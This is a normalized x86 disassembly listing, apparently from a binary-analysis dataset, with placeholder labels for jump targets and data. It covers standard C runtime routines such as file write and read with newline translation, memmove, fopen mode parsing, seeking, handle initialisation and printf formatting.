mov [ esi + 0xc ] eax
jmp r-xdata
sub_40aec1
push ebx
push esi
push edi
xor esi esi
xor ebx ebx
xor edi edi
cmp [ rw-data ] esi
jle r-xdata
cmp [ esp + 0x10 ] 0x1
mov eax ebx
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + esi * 4 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
inc esi
cmp esi [ rw-data ]
jl r-xdata
mov ecx [ eax + 0xc ]
test cl 0x83
je r-xdata
cmp [ esp + 0x10 ] 0x1
jne r-xdata
cmp [ esp + 0x10 ] 0x0
jne r-xdata
push eax
call sub_40ae21
cmp eax 0xffffffff
pop ecx
je r-xdata
test cl 0x2
je r-xdata
inc ebx
jmp r-xdata
push eax
call sub_40ae21
cmp eax 0xffffffff
pop ecx
jne r-xdata
or edi eax
sub_40af2e
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0xc ]
mov eax [ esi + 0xc ]
mov ebx [ esi + 0x10 ]
test al 0x82
je r-xdata
or al 0x20
mov [ esi + 0xc ] eax
test al 0x40
jne r-xdata
test al 0x1
je r-xdata
mov eax [ esi + 0xc ]
and [ esi + 0x4 ] 0x0
and [ ebp + 0xc ] 0x0
and al 0xef
or al 0x2
test ax 0x10c
mov [ esi + 0xc ] eax
jne r-xdata
and [ esi + 0x4 ] 0x0
test al 0x10
je r-xdata
test [ esi + 0xc ] 0x108
push edi
je r-xdata
cmp esi rw-data
je r-xdata
mov ecx [ esi + 0x8 ]
and al 0xfe
mov [ esi ] ecx
mov [ esi + 0xc ] eax
push 0x1
lea eax [ ebp + 0x8 ]
pop edi
push edi
push eax
push ebx
call sub_40b043
add esp 0xc
mov [ ebp + 0xc ] eax
mov eax [ esi + 0x8 ]
mov edi [ esi ]
sub edi eax
lea ecx [ eax + 0x1 ]
mov [ esi ] ecx
mov ecx [ esi + 0x18 ]
dec ecx
test edi edi
mov [ esi + 0x4 ] ecx
jle r-xdata
push ebx
call sub_40d6ed
test eax eax
pop ecx
jne r-xdata
cmp esi rw-data
jne r-xdata
mov eax [ ebp + 0x8 ]
and eax 0xff
jmp r-xdata
or [ esi + 0xc ] 0x20
jmp r-xdata
cmp ebx 0xffffffff
je r-xdata
push edi
push eax
push ebx
call sub_40b043
add esp 0xc
mov [ ebp + 0xc ] eax
jmp r-xdata
push esi
call sub_40d6a9
pop ecx
pop esi
pop ebx
pop ebp
retn
or eax 0xffffffff
mov eax rw-data
mov eax ebx
mov ecx ebx
sar eax 0x5
and ecx 0x1f
mov eax [ eax * 4 + rw-data ]
lea eax [ eax + ecx * 8 ]
jmp r-xdata
mov eax [ esi + 0x8 ]
mov cl [ ebp + 0x8 ]
mov [ eax ] cl
jmp r-xdata
push 0x2
push 0x0
push ebx
call sub_40b9e2
add esp 0xc
test [ eax + 0x4 ] 0x20
je r-xdata
cmp [ ebp + 0xc ] edi
pop edi
je r-xdata
sub_40b043
push ebp
mov ebp esp
sub esp 0x414
mov ecx [ ebp + 0x8 ]
push ebx
cmp ecx [ rw-data ]
push esi
push edi
jae r-xdata
and [ rw-data ] 0x0
mov [ rw-data ] 0x9
mov eax ecx
mov esi ecx
sar eax 0x5
and esi 0x1f
lea ebx [ eax * 4 + rw-data ]
shl esi 0x3
mov eax [ ebx ]
mov al [ eax + esi + 0x4 ]
test al 0x1
je r-xdata
xor edi edi
cmp [ ebp + 0x10 ] edi
mov [ ebp - 0x8 ] edi
mov [ ebp - 0x10 ] edi
jne r-xdata
test al 0x20
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebx ]
add eax esi
test [ eax + 0x4 ] 0x80
je r-xdata
push 0x2
push edi
push ecx
call sub_40b9e2
add esp 0xc
pop edi
pop esi
pop ebx
leave
retn
lea ecx [ ebp - 0xc ]
push edi
push ecx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ ebp + 0x10 ] edi
mov [ ebp - 0x4 ] eax
mov [ ebp + 0x8 ] edi
jbe r-xdata
call [ GetLastError@IAT ]
mov [ ebp + 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0xc ]
mov [ ebp + 0x8 ] edi
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebx ]
test [ eax + esi + 0x4 ] 0x40
je r-xdata
lea eax [ ebp - 0x414 ]
mov eax [ ebp - 0x8 ]
cmp eax edi
jne r-xdata
mov [ rw-data ] 0x1c
mov [ rw-data ] edi
jmp r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x1a
je r-xdata
mov edi eax
lea eax [ ebp - 0x414 ]
sub edi eax
lea eax [ ebp - 0xc ]
push 0x0
push eax
lea eax [ ebp - 0x414 ]
push edi
push eax
mov eax [ ebx ]
push [ eax + esi ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
inc [ ebp - 0x4 ]
mov cl [ ecx ]
cmp cl 0xa
jne r-xdata
sub eax [ ebp - 0x10 ]
jmp r-xdata
cmp [ ebp + 0x8 ] edi
je r-xdata
or eax 0xffffffff
call [ GetLastError@IAT ]
mov [ ebp + 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0xc ]
add [ ebp - 0x8 ] eax
cmp eax edi
jl r-xdata
mov [ eax ] cl
inc eax
mov ecx eax
lea edx [ ebp - 0x414 ]
sub ecx edx
cmp ecx 0x400
jl r-xdata
inc [ ebp - 0x10 ]
mov [ eax ] 0xd
inc eax
push 0x5
pop eax
cmp [ ebp + 0x8 ] eax
jne r-xdata
xor edi edi
mov eax [ ebp - 0x4 ]
sub eax [ ebp + 0xc ]
cmp eax [ ebp + 0x10 ]
jb r-xdata
mov ecx [ ebp - 0x4 ]
sub ecx [ ebp + 0xc ]
cmp ecx [ ebp + 0x10 ]
jae r-xdata
push [ ebp + 0x8 ]
call sub_40d36f
pop ecx
jmp r-xdata
mov [ rw-data ] 0x9
mov [ rw-data ] eax
jmp r-xdata
sub_40b1f0
push ebp
mov ebp esp
push edi
push esi
mov esi [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
mov edi [ ebp + 0x8 ]
mov eax ecx
mov edx ecx
add eax esi
cmp edi esi
jbe r-xdata
test edi 0x3
jne r-xdata
cmp edi eax
jb r-xdata
mov eax edi
mov edx 0x3
sub ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
test edi 0x3
jne r-xdata
jmp [ ecx * 4 + r-xdata ]
and eax 0x3
add ecx eax
jmp [ eax * 4 + jump_table_40b250 ]
jmp [ ecx * 4 + jump_table_40b2cc ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_40b338 ]
mov eax edi
mov edx 0x3
cmp ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
add esi 0x3
add edi 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
add esi 0x2
add edi 0x2
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
inc esi
shr ecx 0x2
inc edi
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 - 0x1c ]
mov [ edi + ecx * 4 - 0x1c ] eax
mov eax [ esi + ecx * 4 - 0x18 ]
mov [ edi + ecx * 4 - 0x18 ] eax
mov eax [ esi + ecx * 4 - 0x14 ]
mov [ edi + ecx * 4 - 0x14 ] eax
mov eax [ esi + ecx * 4 - 0x10 ]
mov [ edi + ecx * 4 - 0x10 ] eax
mov eax [ esi + ecx * 4 - 0xc ]
mov [ edi + ecx * 4 - 0xc ] eax
mov eax [ esi + ecx * 4 - 0x8 ]
mov [ edi + ecx * 4 - 0x8 ] eax
mov eax [ esi + ecx * 4 - 0x4 ]
mov [ edi + ecx * 4 - 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_40b338 ]
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
jmp [ ecx * 4 + jump_table_40b4d0 ]
and eax 0x3
sub ecx eax
jmp [ eax * 4 + jump_table_40b3d8 ]
neg ecx
jmp [ ecx * 4 + r-xdata ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_40b4d0 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_40b338 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_40b338 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_40b338 ]
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
dec esi
shr ecx 0x2
dec edi
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
sub esi 0x2
sub edi 0x2
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
sub esi 0x3
sub edi 0x3
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 + 0x1c ]
mov [ edi + ecx * 4 + 0x1c ] eax
mov eax [ esi + ecx * 4 + 0x18 ]
mov [ edi + ecx * 4 + 0x18 ] eax
mov eax [ esi + ecx * 4 + 0x14 ]
mov [ edi + ecx * 4 + 0x14 ] eax
mov eax [ esi + ecx * 4 + 0x10 ]
mov [ edi + ecx * 4 + 0x10 ] eax
mov eax [ esi + ecx * 4 + 0xc ]
mov [ edi + ecx * 4 + 0xc ] eax
mov eax [ esi + ecx * 4 + 0x8 ]
mov [ edi + ecx * 4 + 0x8 ] eax
mov eax [ esi + ecx * 4 + 0x4 ]
mov [ edi + ecx * 4 + 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_40b4d0 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_40b4d0 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_40b4d0 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_40b4d0 ]
sub_40b525
push ebp
mov ebp esp
push ecx
push ecx
mov edx [ ebp + 0xc ]
push ebx
xor ebx ebx
push esi
movzx eax [ edx ]
mov esi [ rw-data ]
cmp eax 0x61
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] ebx
je r-xdata
mov ecx 0x109
cmp eax 0x72
je r-xdata
push 0x1a4
push [ ebp + 0x10 ]
push ecx
push [ ebp + 0x8 ]
call sub_40d713
add esp 0x10
mov ecx eax
cmp ecx ebx
pop edi
jge r-xdata
cmp edi ebx
je r-xdata
xor ecx ecx
or esi 0x1
jmp r-xdata
cmp eax 0x77
jne r-xdata
mov eax [ ebp + 0x14 ]
inc [ rw-data ]
mov [ eax + 0xc ] esi
mov [ eax + 0x4 ] ebx
mov [ eax ] ebx
mov [ eax + 0x8 ] ebx
mov [ eax + 0x1c ] ebx
mov [ eax + 0x10 ] ecx
xor eax eax
jmp r-xdata
movzx eax ax
cmp eax 0x54
jg r-xdata
push edi
push 0x1
pop edi
mov ecx 0x301
jmp r-xdata
pop esi
pop ebx
leave
retn
sub eax 0x62
je r-xdata
je r-xdata
or esi 0x2
test ch 0xc0
je r-xdata
dec eax
je r-xdata
mov eax 0x1000
test eax ecx
jne r-xdata
sub eax 0x2b
je r-xdata
or ch 0x80
jmp r-xdata
xor edi edi
jmp r-xdata
cmp [ ebp - 0x8 ] ebx
jne r-xdata
sub eax 0xb
je r-xdata
or ecx eax
jmp r-xdata
test cl 0x2
jne r-xdata
sub eax 0x19
je r-xdata
inc edx
inc edx
mov ax [ edx ]
cmp ax bx
je r-xdata
mov [ ebp - 0x8 ] 0x1
or esi 0x4000
jmp r-xdata
cmp [ ebp - 0x8 ] ebx
jne r-xdata
sub eax 0x6
jne r-xdata
and ecx 0xfffffffe
and esi 0xfffffffc
or ecx 0x2
or esi 0x80
jmp r-xdata
test cl 0x40
jne r-xdata
sub eax 0xe
je r-xdata
mov [ ebp - 0x8 ] 0x1
and esi 0xffffbfff
jmp r-xdata
test ch 0xc0
jne r-xdata
or ecx 0x40
jmp r-xdata
cmp [ ebp - 0x4 ] ebx
jne r-xdata
dec eax
jne r-xdata
or ch 0x40
jmp r-xdata
mov [ ebp - 0x4 ] 0x1
or ecx 0x10
jmp r-xdata
cmp [ ebp - 0x4 ] ebx
jne r-xdata
mov [ ebp - 0x4 ] 0x1
or ecx 0x20
jmp r-xdata
sub_40b69b
mov edx [ rw-data ]
push ebx
push ebp
push esi
xor ebp ebp
xor esi esi
xor eax eax
cmp edx ebp
push edi
jle r-xdata
mov eax esi
pop edi
pop esi
pop ebp
pop ebx
retn
mov ebx [ rw-data ]
mov edi ebx
mov edi eax
push 0x20
shl edi 0x2
call sub_4083df
pop ecx
mov ecx [ rw-data ]
mov [ edi + ecx ] eax
mov eax [ rw-data ]
mov edi [ edi + eax ]
cmp edi ebp
je r-xdata
test [ ecx + 0xc ] 0x83
je r-xdata
mov esi edi
mov esi [ ebx + eax * 4 ]
jmp r-xdata
inc eax
add edi 0x4
cmp eax edx
jl r-xdata
or [ esi + 0x10 ] 0xffffffff
mov [ esi + 0x4 ] ebp
mov [ esi + 0xc ] ebp
mov [ esi + 0x8 ] ebp
mov [ esi ] ebp
mov [ esi + 0x1c ] ebp
cmp esi ebp
je r-xdata
mov ecx [ edi ]
cmp ecx ebp
je r-xdata
jmp r-xdata
sub_40b713
push esi
mov esi [ esp + 0x8 ]
mov eax [ esi + 0xc ]
test al 0x83
je r-xdata
or eax 0xffffffff
pop esi
retn
test al 0x40
jne r-xdata
test al 0x2
je r-xdata
or al 0x1
test ax 0x10c
mov [ esi + 0xc ] eax
jne r-xdata
or al 0x20
mov [ esi + 0xc ] eax
jmp r-xdata
mov eax [ esi + 0x8 ]
mov [ esi ] eax
push esi
call sub_40d6a9
pop ecx
jmp r-xdata
neg eax
sbb eax eax
and eax 0x10
add eax 0x10
or [ esi + 0xc ] eax
and [ esi + 0x4 ] 0x0
cmp eax 0xffffffff
je r-xdata
push [ esi + 0x18 ]
push [ esi + 0x8 ]
push [ esi + 0x10 ]
call sub_40b7ec
add esp 0xc
mov [ esi + 0x4 ] eax
test eax eax
je r-xdata
mov edx [ esi + 0xc ]
test dl 0x82
jne r-xdata
cmp [ esi + 0x18 ] 0x200
jne r-xdata
mov ecx [ esi + 0x10 ]
push edi
cmp ecx 0xffffffff
je r-xdata
mov ecx [ esi ]
dec eax
mov [ esi + 0x4 ] eax
movzx eax [ ecx ]
inc ecx
mov [ esi ] ecx
pop esi
retn
mov ecx [ esi + 0xc ]
test cl 0x8
je r-xdata
mov edi rw-data
mov edi ecx
sar edi 0x5
and ecx 0x1f
mov edi [ edi * 4 + rw-data ]
lea edi [ edi + ecx * 8 ]
jmp r-xdata
test ch 0x4
jne r-xdata
or dh 0x20
mov [ esi + 0xc ] edx
mov cl [ edi + 0x4 ]
pop edi
and cl 0x82
cmp cl 0x82
jne r-xdata
mov [ esi + 0x18 ] 0x1000
sub_40b7ec
push ebp
mov ebp esp
sub esp 0xc
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
cmp esi [ rw-data ]
jae r-xdata
and [ rw-data ] 0x0
mov [ rw-data ] 0x9
mov eax esi
and esi 0x1f
sar eax 0x5
shl esi 0x3
lea ebx [ eax * 4 + rw-data ]
mov eax [ eax * 4 + rw-data ]
add eax esi
mov dl [ eax + 0x4 ]
test dl 0x1
je r-xdata
and [ ebp - 0x8 ] 0x0
mov edi [ ebp + 0xc ]
cmp [ ebp + 0x10 ] 0x0
mov ecx edi
je r-xdata
xor eax eax
jmp r-xdata
test dl 0x2
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
test dl 0x48
je r-xdata
lea eax [ ebp - 0xc ]
push 0x0
push eax
mov eax [ ebx ]
push [ ebp + 0x10 ]
push ecx
push [ eax + esi ]
call [ ReadFile@IAT ]
test eax eax
jne r-xdata
mov al [ eax + 0x5 ]
cmp al 0xa
je r-xdata
mov eax [ ebx ]
mov edx [ ebp - 0xc ]
add [ ebp - 0x8 ] edx
lea ecx [ eax + esi + 0x4 ]
mov al [ eax + esi + 0x4 ]
test al 0x80
je r-xdata
call [ GetLastError@IAT ]
push 0x5
pop ecx
cmp eax ecx
jne r-xdata
dec [ ebp + 0x10 ]
mov [ edi ] al
mov eax [ ebx ]
lea ecx [ edi + 0x1 ]
mov [ ebp - 0x8 ] 0x1
mov [ eax + esi + 0x5 ] 0xa
mov eax [ ebp - 0x8 ]
jmp r-xdata
test edx edx
je r-xdata
cmp eax 0x6d
jne r-xdata
mov [ rw-data ] 0x9
mov [ rw-data ] ecx
jmp r-xdata
and al 0xfb
cmp [ edi ] 0xa
jne r-xdata
push eax
call sub_40d36f
pop ecx
jmp r-xdata
or eax 0xffffffff
sub edi [ ebp + 0xc ]
mov [ ebp - 0x8 ] edi
mov eax [ ebp + 0x10 ]
mov al [ eax ]
cmp al 0x1a
je r-xdata
or al 0x4
jmp r-xdata
mov eax [ ebx ]
lea esi [ eax + esi + 0x4 ]
mov al [ esi ]
test al 0x40
jne r-xdata
cmp al 0xd
je r-xdata
mov [ ecx ] al
mov eax [ ebp + 0xc ]
mov ecx [ ebp - 0x8 ]
mov [ ebp + 0x10 ] eax
add ecx eax
cmp eax ecx
mov [ ebp - 0x8 ] ecx
jae r-xdata
or al 0x2
mov [ esi ] al
dec ecx
cmp [ ebp + 0x10 ] ecx
jae r-xdata
mov [ edi ] al
inc edi
inc [ ebp + 0x10 ]
jmp r-xdata
lea eax [ ebp - 0xc ]
push 0x0
push eax
inc [ ebp + 0x10 ]
lea eax [ ebp - 0x1 ]
push 0x1
push eax
mov eax [ ebx ]
push [ eax + esi ]
call [ ReadFile@IAT ]
test eax eax
jne r-xdata
mov eax [ ebp + 0x10 ]
inc eax
cmp [ eax ] 0xa
jne r-xdata
mov ecx [ ebp - 0x8 ]
cmp [ ebp + 0x10 ] ecx
jb r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
call [ GetLastError@IAT ]
test eax eax
jne r-xdata
mov [ edi ] 0xd
inc edi
mov [ ebp + 0x10 ] eax
jmp r-xdata
add [ ebp + 0x10 ] 0x2
jmp r-xdata
jmp r-xdata
mov [ edi ] 0xd
mov eax [ ebx ]
test [ eax + esi + 0x4 ] 0x48
je r-xdata
mov [ edi ] 0xa
jmp r-xdata
cmp edi [ ebp + 0xc ]
jne r-xdata
mov al [ ebp - 0x1 ]
cmp al 0xa
je r-xdata
inc edi
push 0x1
push 0xffffffff
push [ ebp + 0x8 ]
call sub_40b9e2
add esp 0xc
cmp [ ebp - 0x1 ] 0xa
je r-xdata
cmp [ ebp - 0x1 ] 0xa
jne r-xdata
mov [ edi ] 0xd
mov ecx [ ebx ]
inc edi
mov [ ecx + esi + 0x5 ] al
jmp r-xdata
sub_40b9e2
mov eax [ esp + 0x4 ]
push ebx
cmp eax [ rw-data ]
push esi
push edi
jae r-xdata
and [ rw-data ] 0x0
mov [ rw-data ] 0x9
mov ecx eax
mov esi eax
sar ecx 0x5
and esi 0x1f
lea edi [ ecx * 4 + rw-data ]
shl esi 0x3
mov ecx [ edi ]
test [ ecx + esi + 0x4 ] 0x1
je r-xdata
push eax
call sub_40d55c
cmp eax 0xffffffff
pop ecx
jne r-xdata
push [ esp + 0x18 ]
push 0x0
push [ esp + 0x1c ]
push eax
call [ SetFilePointer@IAT ]
mov ebx eax
cmp ebx 0xffffffff
jne r-xdata
mov [ rw-data ] 0x9
jmp r-xdata
xor eax eax
call [ GetLastError@IAT ]
jmp r-xdata
or eax 0xffffffff
mov eax [ edi ]
and [ eax + esi + 0x4 ] 0xfd
lea eax [ eax + esi + 0x4 ]
mov eax ebx
jmp r-xdata
push eax
call sub_40d36f
pop ecx
jmp r-xdata
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
sub_40ba7c
sub esp 0x44
push ebx
push ebp
push esi
push edi
push 0x100
call sub_4083df
mov esi eax
pop ecx
test esi esi
jne r-xdata
mov [ rw-data ] esi
mov [ rw-data ] 0x20
lea eax [ esi + 0x100 ]
push 0x1b
call sub_409624
pop ecx
lea eax [ esp + 0x10 ]
push eax
call [ GetStartupInfoA@IAT ]
cmp [ esp + 0x42 ] 0x0
je r-xdata
and [ esi + 0x4 ] 0x0
or [ esi ] 0xffffffff
mov [ esi + 0x5 ] 0xa
mov eax [ rw-data ]
add esi 0x8
add eax 0x100
jmp r-xdata
xor ebx ebx
mov eax [ esp + 0x44 ]
test eax eax
je r-xdata
cmp esi eax
jae r-xdata
or [ esi + 0x4 ] 0x80
test ebx ebx
mov [ esi + 0x4 ] 0x81
jne r-xdata
mov esi [ eax ]
lea ebp [ eax + 0x4 ]
mov eax 0x800
cmp esi eax
lea ebx [ esi + ebp ]
jl r-xdata
mov eax [ rw-data ]
cmp [ eax + ebx * 8 ] 0xffffffff
lea esi [ eax + ebx * 8 ]
jne r-xdata
push [ rw-data ]
call [ SetHandleCount@IAT ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x44
retn
mov eax ebx
dec eax
neg eax
sbb eax eax
add eax 0xfffffff5
push 0xfffffff6
pop eax
jmp r-xdata
cmp [ rw-data ] esi
jge r-xdata
mov esi eax
or [ esi + 0x4 ] 0x40
jmp r-xdata
push edi
call [ GetFileType@IAT ]
test eax eax
je r-xdata
push eax
call [ GetStdHandle@IAT ]
mov edi eax
cmp edi 0xffffffff
je r-xdata
xor edi edi
test esi esi
jle r-xdata
mov edi rw-data
inc ebx
cmp ebx 0x3
jl r-xdata
and eax 0xff
mov [ esi ] edi
cmp eax 0x2
jne r-xdata
mov eax [ ebx ]
cmp eax 0xffffffff
je r-xdata
mov esi [ rw-data ]
add [ rw-data ] 0x20
mov [ edi ] eax
lea ecx [ eax + 0x100 ]
cmp eax 0x3
jne r-xdata
inc edi
inc ebp
add ebx 0x4
cmp edi esi
jl r-xdata
mov cl [ ebp ]
test cl 0x1
je r-xdata
add edi 0x4
cmp [ rw-data ] esi
jl r-xdata
and [ eax + 0x4 ] 0x0
or [ eax ] 0xffffffff
mov [ eax + 0x5 ] 0xa
mov ecx [ edi ]
add eax 0x8
add ecx 0x100
jmp r-xdata
or [ esi + 0x4 ] 0x8
jmp r-xdata
test cl 0x8
jne r-xdata
push 0x100
call sub_4083df
test eax eax
pop ecx
je r-xdata
jmp r-xdata
cmp eax ecx
jae r-xdata
mov eax edi
mov ecx edi
sar eax 0x5
and ecx 0x1f
mov eax [ eax * 4 + rw-data ]
lea eax [ eax + ecx * 8 ]
mov ecx [ ebx ]
mov [ eax ] ecx
mov cl [ ebp ]
mov [ eax + 0x4 ] cl
push eax
call [ GetFileType@IAT ]
test eax eax
je r-xdata
sub_40bc27
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
lea ecx [ eax + 0x1 ]
cmp ecx 0x100
ja r-xdata
mov ecx eax
push esi
mov esi [ rw-data ]
sar ecx 0x8
movzx edx cl
test [ esi + edx * 2 + 0x1 ] 0x80
pop esi
je r-xdata
mov ecx [ rw-data ]
movzx eax [ ecx + eax * 2 ]
jmp r-xdata
and [ ebp - 0x3 ] 0x0
mov [ ebp - 0x4 ] al
push 0x1
and [ ebp - 0x2 ] 0x0
mov [ ebp - 0x4 ] cl
mov [ ebp - 0x3 ] al
push 0x2
jmp r-xdata
and eax [ ebp + 0xc ]
leave
retn
movzx eax [ ebp + 0xa ]
leave
retn
pop eax
lea ecx [ ebp + 0xa ]
push 0x1
push 0x0
push 0x0
push ecx
push eax
lea eax [ ebp - 0x4 ]
push eax
push 0x1
call sub_40d9cd
add esp 0x1c
test eax eax
jne r-xdata
sub_40bca0
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
or ecx eax
mov ecx [ esp + 0xc ]
jne r-xdata
push ebx
mul ecx
mov ebx eax
mov eax [ esp + 0x8 ]
mul [ esp + 0x14 ]
add ebx eax
mov eax [ esp + 0x8 ]
mul ecx
add edx ebx
pop ebx
retn 0x10
mov eax [ esp + 0x4 ]
mul ecx
retn 0x10
sub_40bce0
mov edx [ esp + 0x4 ]
mov ecx [ esp + 0x8 ]
test edx 0x3
jne r-xdata
test edx 0x1
je r-xdata
mov eax [ edx ]
cmp al [ ecx ]
jne r-xdata
mov ax [ edx ]
add edx 0x2
cmp al [ ecx ]
jne r-xdata
mov al [ edx ]
inc edx
cmp al [ ecx ]
jne r-xdata
sbb eax eax
shl eax 0x1
inc eax
retn
or al al
je r-xdata
or al al
je r-xdata
inc ecx
or al al
je r-xdata
xor eax eax
retn
cmp ah [ ecx + 0x1 ]
jne r-xdata
cmp ah [ ecx + 0x1 ]
jne r-xdata
test edx 0x2
je r-xdata
or ah ah
je r-xdata
or ah ah
je r-xdata
shr eax 0x10
cmp al [ ecx + 0x2 ]
jne r-xdata
add ecx 0x2
jmp r-xdata
or al al
je r-xdata
cmp ah [ ecx + 0x3 ]
jne r-xdata
add ecx 0x4
add edx 0x4
or ah ah
jne r-xdata
mov edi edi
sub_40bd64
push esi
mov esi [ esp + 0x8 ]
mov eax [ esi ]
cmp [ eax ] 0xe06d7363
jne r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
cmp [ eax + 0x10 ] 0x3
jne r-xdata
xor eax eax
push eax
call sub_40d340
test eax eax
pop ecx
je r-xdata
cmp [ eax + 0x14 ] 0x19930520
jne r-xdata
push esi
call [ rw-data ]
jmp r-xdata
jmp sub_40aa4c
pop esi
retn 0x4
sub_40bdc8
push ebp
mov ebp esp
sub esp 0x248
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
xor esi esi
mov bl [ edi ]
inc edi
test bl bl
mov [ ebp - 0xc ] esi
mov [ ebp - 0x14 ] esi
mov [ ebp + 0xc ] edi
je r-xdata
mov eax [ ebp - 0x14 ]
pop edi
pop esi
pop ebx
leave
retn
mov ecx [ ebp - 0x10 ]
xor edx edx
jmp r-xdata
cmp [ ebp - 0x14 ] edx
jl r-xdata
cmp bl 0x20
jl r-xdata
xor eax eax
cmp bl 0x78
jg r-xdata
mov edi [ ebp + 0xc ]
mov bl [ edi ]
inc edi
test bl bl
mov [ ebp + 0xc ] edi
jne r-xdata
jmp [ eax * 4 + jump_table_40c4e9 ]
movsx eax bl
mov al [ eax + r--data ]
and eax 0xf
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov esi [ ebp - 0x30 ]
xor edx edx
or [ ebp - 0x10 ] 0xffffffff
mov [ ebp - 0x34 ] edx
mov [ ebp - 0x28 ] edx
mov [ ebp - 0x20 ] edx
mov [ ebp - 0x1c ] edx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x24 ] edx
jmp r-xdata
movsx eax bl
sub eax 0x20
je r-xdata
cmp bl 0x2a
jne r-xdata
mov [ ebp - 0x10 ] edx
jmp r-xdata
cmp bl 0x2a
jne r-xdata
cmp bl 0x49
je r-xdata
mov ecx [ rw-data ]
mov [ ebp - 0x24 ] edx
movzx eax bl
test [ ecx + eax * 2 + 0x1 ] 0x80
je r-xdata
movsx eax bl
cmp eax 0x67
jg r-xdata
movsx eax [ esi + eax * 8 + r--data ]
sar eax 0x4
cmp eax 0x7
mov [ ebp - 0x30 ] eax
ja r-xdata
or [ ebp - 0x4 ] 0x2
jmp r-xdata
sub eax 0x3
je r-xdata
mov eax [ ebp - 0x20 ]
movsx ecx bl
lea eax [ eax + eax * 4 ]
lea eax [ ecx + eax * 2 - 0x30 ]
jmp r-xdata
lea eax [ ebp + 0x10 ]
push eax
call sub_40c5a7
test eax eax
pop ecx
mov [ ebp - 0x20 ] eax
jge r-xdata
lea eax [ ecx + ecx * 4 ]
movsx ecx bl
lea eax [ ecx + eax * 2 - 0x30 ]
mov [ ebp - 0x10 ] eax
jmp r-xdata
lea eax [ ebp + 0x10 ]
push eax
call sub_40c5a7
test eax eax
pop ecx
mov [ ebp - 0x10 ] eax
jge r-xdata
